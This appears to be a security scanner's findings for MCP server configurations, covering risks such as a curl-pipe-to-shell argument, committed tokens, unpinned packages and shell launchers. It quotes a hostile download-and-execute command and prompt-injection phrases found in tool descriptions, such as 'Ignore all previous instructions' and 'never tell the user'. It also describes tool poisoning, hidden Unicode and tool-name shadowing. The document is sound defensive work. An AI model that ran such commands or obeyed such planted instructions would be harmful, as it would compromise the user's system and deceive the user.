findings.title: Argument pipes a remote download into a shell
findings.detail: Argument "require('child_process').execSync('curl -s https://example.invalid/install.sh | sh')" downloads remote content and pipes it into a shell.
findings.remediation: Remove download-and-execute arguments. Install the server from a pinned package through a package manager instead.

findings.title: Live credential committed in env block
findings.detail: The value of GITHUB_TOKEN matches the format of a GitHub personal access token (ghp_...). Anyone with read access to this config file owns the credential.
findings.remediation: Rotate this credential now (treat it as leaked), remove it from the config, and inject it at runtime via an environment reference such as ${VAR} or a secret manager.

findings.title: Server is launched through a shell
findings.detail: The server command is 'bash', a shell interpreter. Anything the MCP host passes (or a poisoned tool description tricks it into passing) becomes arbitrary command execution.
findings.remediation: Invoke the server binary directly (e.g. 'node', 'python', the absolute path to the executable) instead of via a shell, and never use 'sh -c' style wrappers.

findings.title: Tool description contains instruction-like content
findings.detail: Description tells the model to ignore other instructions: matched 'Ignore all previous instructions'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
findings.remediation: Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

findings.title: Tool description contains instruction-like content
findings.detail: Description tells the model to hide behaviour from the user: matched 'never tell the user'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
findings.remediation: Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

findings.title: Server is granted an overly broad filesystem path
findings.detail: Argument '/' grants access to a root/home-level path. A compromised or poisoned server can read or modify everything under it (SSH keys, cloud credentials, documents).
findings.remediation: Scope the server to the narrowest project directory it actually needs instead of '/', '~' or a drive root.

findings.title: Secret-looking value stored in env block
findings.detail: Variable BACKUP_PASSWORD has a secret-sounding name and a non-placeholder value stored in plaintext in the config file.
findings.remediation: Move the secret out of the config file: reference the host environment (e.g. "${BACKUP_PASSWORD}") or use a secret manager, and rotate the value if the file was ever shared or committed.

findings.title: Tool description contains instruction-like content
findings.detail: Description tries to force invocation order over other tools: matched 'before using any other tool'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
findings.remediation: Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

findings.title: Tool description contains instruction-like content
findings.detail: Description issues standing orders to the model: matched 'You must never'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
findings.remediation: Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

findings.title: Hidden Unicode characters in tool name/description
findings.detail: Found invisible/control characters (U+200B, U+202E). These can hide instructions from human reviewers while the model still reads them.
findings.remediation: Strip all zero-width and bidirectional control characters from tool names and descriptions; re-type the text plainly.

findings.title: Tool names collide after normalisation
findings.detail: Names read-file, read_file differ only by case or separators ('_', '-'), which many hosts and models treat as the same tool.
findings.remediation: Rename one of the tools so every tool name is unambiguous.

findings.title: Tool name squats a well-known tool name
findings.detail: 'read_file' is the name of a tool shipped by a popular MCP server. When two servers offer the same name, the model (and the user) cannot tell which implementation actually runs, so a malicious server can shadow a trusted one.
findings.remediation: Namespace third-party tool names (e.g. 'acme_read_file') and remove servers that re-define names you already trust.

findings.title: Tool has no inputSchema
findings.detail: Without an inputSchema the host cannot validate arguments before they reach the server, and the model must guess the parameter shape.
findings.remediation: Add a JSON Schema inputSchema describing every parameter, its type and constraints.

findings.title: Package executed without a version pin (npx)
findings.detail: 'npx @modelcontextprotocol/server-filesystem' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.
findings.remediation: Pin an exact version, e.g. '@modelcontextprotocol/server-filesystem@1.2.3', review the package, and only bump versions deliberately.

findings.title: Package executed without a version pin (npx)
findings.detail: 'npx @modelcontextprotocol/server-github@latest' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.
findings.remediation: Pin an exact version, e.g. '@modelcontextprotocol/server-github@1.2.3', review the package, and only bump versions deliberately.

findings.title: Package executed without a version pin (uvx)
findings.detail: 'uvx mcp-server-sqlite' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.
findings.remediation: Pin an exact version, e.g. 'mcp-server-sqlite@1.2.3', review the package, and only bump versions deliberately.

findings.title: Tool description is excessively long
findings.detail: Description is 1439 characters. Very long descriptions are a common place to bury injected instructions and inflate the tool's influence over the model.
findings.remediation: Trim the description to a concise summary of behaviour, inputs and outputs.

findings.title: Tool inputSchema lacks constraints
findings.detail: string parameter 'text' has no maxLength/enum/format constraint; additionalProperties is not false, so undeclared parameters are accepted.
findings.remediation: Constrain string parameters (maxLength, enum or format), and set additionalProperties to false so only declared parameters are accepted.
